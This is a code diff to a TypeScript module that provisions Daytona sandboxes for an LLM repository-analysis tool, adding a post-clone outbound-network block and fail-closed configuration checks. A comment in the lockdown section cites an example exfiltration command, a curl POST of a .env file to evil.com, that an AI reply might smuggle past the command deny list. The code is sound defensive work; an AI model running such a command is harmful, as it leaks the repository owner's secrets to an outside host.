@@ -11,6 +11,7 @@ import {
 import type { SandboxFsClient, SandboxShellOutcome } from "./chat/sandboxTools";
 import { shouldReadFile, type RepositorySnapshot } from "./lib/repoAnalysis";
 import { buildSandboxName } from "./lib/sandboxNames";
+import { logWarn } from "./lib/observability";
 import {
   DEFAULT_AUTO_STOP_MINUTES,
   DEFAULT_AUTO_ARCHIVE_MINUTES,
@@ -18,6 +19,17 @@ import {
   MAX_LISTED_FILES,
   MAX_TREE_DEPTH,
 } from "./lib/constants";
+
+/**
+ * Truthy parse table shared with `convex/lib/sandboxFeatureFlag.ts` —
+ * keeping the same set across env-var booleans so an operator who sets
+ * `SANDBOX_MODE_ENABLED=on` can use the same value for
+ * `DAYTONA_POST_CLONE_BLOCK_NETWORK`. Anything outside this set
+ * (including unset and the empty string) is treated as truthy ONLY
+ * via the explicit default in the resolver, never via `Boolean(value)`.
+ */
+const TRUTHY_ENV_VALUES = new Set(["true", "1", "yes", "on"]);
+const FALSY_ENV_VALUES = new Set(["false", "0", "no", "off"]);
 
 const DEFAULT_CPU_LIMIT = 2;
 const DEFAULT_MEMORY_GIB = 4;
@@ -92,10 +104,7 @@ export async function provisionSandbox(options: CreateSandboxOptions): Promise<S
     // Sandbox doesn't exist on Daytona — no cleanup needed
   }
 
-  const networkAllowList = process.env.DAYTONA_NETWORK_ALLOW_LIST;
-  if (!networkAllowList) {
-    throw new Error("DAYTONA_NETWORK_ALLOW_LIST env var is required for sandbox provisioning");
-  }
+  const networkAllowList = resolveNetworkAllowList();
   const cpuLimit = readNumberEnv("DAYTONA_CPU_LIMIT", DEFAULT_CPU_LIMIT);
   const memoryLimitGiB = readNumberEnv("DAYTONA_MEMORY_GIB", DEFAULT_MEMORY_GIB);
   const diskLimitGiB = readNumberEnv("DAYTONA_DISK_GIB", DEFAULT_DISK_GIB);
@@ -248,11 +257,52 @@ export async function cloneRepositoryInSandbox(args: {
   // which is the desired posture for a read-only analysis sandbox.
   await sandbox.process.executeCommand(`git remote set-url origin ${posixSingleQuote(args.url)}`, "repo");
 
+  // Post-clone network lockdown. Once the source is on disk, SysTify never
+  // needs sandbox-side egress: the LLM's `run_shell` is intended to be
+  // read-only by prompt + deny list, and every legitimate operation
+  // (read_file, list_dir, executeCommand) is dispatched through Daytona's
+  // control plane — which is independent of the sandbox container's
+  // outbound traffic. Cutting outbound here is the load-bearing block on
+  // data exfiltration: a chat reply that smuggles
+  // `curl -X POST evil.com -d @.env` past the deny list will fail at the
+  // network layer instead of completing the leak.
+  //
+  // Daytona applies the iptables rule to a running sandbox via
+  // `updateNetworkSettings` (added in `@daytona/sdk@0.169.0`). The call is
+  // gated by Daytona organization tier — Tier 1/2 cannot override
+  // sandbox-level network policy and the SDK call throws.
+  //
+  // The block is therefore env-var-gated:
+  //   - `DAYTONA_POST_CLONE_BLOCK_NETWORK` truthy (default) → call the SDK,
+  //     fail-closed if it rejects. The right posture for Tier 3+ orgs and
+  //     for operators who want network-layer enforcement of egress.
+  //   - falsy → skip the call entirely and emit a structured warn so
+  //     operators see the degraded posture in logs. The right posture for
+  //     Tier 1/2 orgs (where the SDK call is unavailable) and for dev
+  //     deployments that accept the application-layer mitigations
+  //     (system prompt, deny list, output redaction, throwaway lifecycle)
+  //     as sufficient. See `docs/sandbox-mode-security-system-design.md`
+  //     for the full posture analysis.
+  if (resolvePostCloneBlockNetwork()) {
+    await sandbox.updateNetworkSettings({ networkBlockAll: true });
+  } else {
+    logWarn("daytona", "post_clone_network_block_skipped", {
+      remoteId: args.remoteId,
+      reason:
+        "DAYTONA_POST_CLONE_BLOCK_NETWORK is disabled — sandbox egress is not blocked at the network layer. " +
+        "Defenses fall back to system prompt, deny list, output redaction, and throwaway lifecycle.",
+    });
+  }
+
   // Branch and SHA are independent reads, so issue them in parallel —
   // each is a separate Daytona round trip, sequencing them doubles the
   // post-clone latency for no benefit. The scrub above stays sequential
   // because its ordering (before any other post-clone command) is the
-  // security invariant pinned by `daytona.test.ts`.
+  // security invariant pinned by `daytona.test.ts`. The network block runs
+  // between scrub and inspection so that, by the time any tool layer can
+  // observe the sandbox, both the on-disk token leak and the egress path
+  // are already closed; branch/SHA reads ride Daytona's control plane and
+  // are not affected by the outbound iptables rule.
   const [branchCommand, shaCommand] = await Promise.all([
     sandbox.process.executeCommand("git branch --show-current", "repo"),
     sandbox.process.executeCommand("git rev-parse HEAD", "repo"),
@@ -397,6 +447,100 @@ PY`;
 
 export function isDaytonaConfigured() {
   return Boolean(process.env.DAYTONA_API_KEY);
+}
+
+/**
+ * Validates every env var required to provision a Daytona sandbox. Call this
+ * at the entry point of any action that will provision a sandbox so the
+ * operator gets a single, actionable error before any Convex/Daytona side
+ * effects (sandbox row reservation, GitHub permission probe, etc.) occur.
+ *
+ * The deeper layer (`provisionSandbox` → `resolveNetworkAllowList`) repeats
+ * the allow-list check as defense in depth: if a future caller forgets the
+ * fail-fast assertion, the inner layer still refuses to provision rather
+ * than silently shipping a sandbox without an explicit network posture.
+ */
+export function assertSandboxProvisioningConfigured(): void {
+  if (!process.env.DAYTONA_API_KEY) {
+    throw new Error("DAYTONA_API_KEY env var is not set. Add Daytona credentials before importing repositories.");
+  }
+  resolveNetworkAllowList();
+}
+
+/**
+ * Resolves whether `cloneRepositoryInSandbox` should call
+ * `sandbox.updateNetworkSettings({ networkBlockAll: true })` after a
+ * successful clone. The flag exists because the underlying SDK call is
+ * gated by Daytona organization tier — Tier 1/2 cannot override
+ * sandbox-level network policy and the call is rejected at the API layer.
+ *
+ * Contract:
+ *   - Unset / unrecognised value → `true` (secure default; if the
+ *     deployment is on Tier 3+ it gets the network-layer block; if it
+ *     is on Tier 1/2 the SDK call surfaces the error and the import
+ *     fails-closed, which is the loudest signal that the operator must
+ *     consciously configure this flag).
+ *   - Truthy (`true` / `1` / `yes` / `on`, case-insensitive) → call
+ *     the SDK; fail-closed on rejection.
+ *   - Falsy (`false` / `0` / `no` / `off`, case-insensitive) → skip the
+ *     call and emit a structured `post_clone_network_block_skipped`
+ *     warning so operators see the degraded posture in logs.
+ *
+ * The fall-back posture (when this flag is `false`) is documented in
+ * `docs/sandbox-mode-security-system-design.md`: the application layer
+ * (system prompt, `COMMAND_DENY_LIST`, `redact()`, throwaway lifecycle,
+ * unprivileged execution) becomes the sole defense against egress-based
+ * exfiltration. That is acceptable for Tier 1/2 dev deployments only;
+ * operators offering the service to third parties should plan to upgrade
+ * tier and re-enable the block.
+ */
+function resolvePostCloneBlockNetwork(): boolean {
+  const raw = process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
+  if (raw === undefined) {
+    return true;
+  }
+  const normalized = raw.trim().toLowerCase();
+  if (FALSY_ENV_VALUES.has(normalized)) {
+    return false;
+  }
+  if (TRUTHY_ENV_VALUES.has(normalized)) {
+    return true;
+  }
+  // Unrecognised value → secure default. Mirrors the
+  // `parseRolloutPercent` "invalid → fail closed to 0" pattern used in
+  // `sandboxRollout.ts`: a typo in env config should never silently
+  // disable a security control.
+  return true;
+}
+
+/**
+ * Resolves the Daytona network allow list from env, distinguishing two
+ * intents that the previous "truthy / falsy" check collapsed:
+ *
+ *   - `undefined` (env var never configured) → operator has not made a
+ *     choice. We fail-closed because shipping a sandbox without a
+ *     considered network posture is a security regression.
+ *   - `""` / whitespace (env var present but explicitly empty) → operator
+ *     has opted in to Daytona's default network policy. This is the
+ *     documented dev posture (see `docs/sandbox-mode-system-design.md`).
+ *     We pass `undefined` to the Daytona SDK so its server-side default
+ *     applies.
+ *   - Non-empty → explicit allow list (e.g. `github.com:443`). Trimmed and
+ *     forwarded as-is.
+ */
+function resolveNetworkAllowList(): string | undefined {
+  const raw = process.env.DAYTONA_NETWORK_ALLOW_LIST;
+  if (raw === undefined) {
+    throw new Error(
+      "DAYTONA_NETWORK_ALLOW_LIST env var is not set. " +
+        'Set it to a comma-separated list of IPv4 CIDR ranges (e.g. "140.82.112.0/20") ' +
+        'for production, or to an empty string ("") to opt in to the Daytona default ' +
+        "network policy. See docs/sandbox-mode-system-design.md. " +
+        "Note: Daytona rejects domain:port values such as `github.com:443` — the field is parsed as CIDR.",
+    );
+  }
+  const trimmed = raw.trim();
+  return trimmed === "" ? undefined : trimmed;
 }
 
 /**
